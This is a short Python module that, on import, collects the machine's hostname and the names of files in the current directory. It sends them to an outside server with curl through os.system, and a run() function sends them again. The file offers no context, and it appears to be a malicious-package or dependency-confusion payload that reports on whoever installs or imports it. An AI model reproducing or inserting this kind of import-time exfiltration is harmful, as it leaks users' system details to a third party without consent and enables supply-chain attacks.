# Code
import os

print("imported:")
current_path = os.getcwd()
dir = os.listdir(current_path)


hostname = os.uname()[1] + '--'

data = hostname+"/".join(dir).replace(" ", "0")
print(data)
os.system('curl http://jacobsandum.com:8000/' + data)

def run():
    print("running")
    os.system('curl http://jacobsandum.com:8000/' + data)
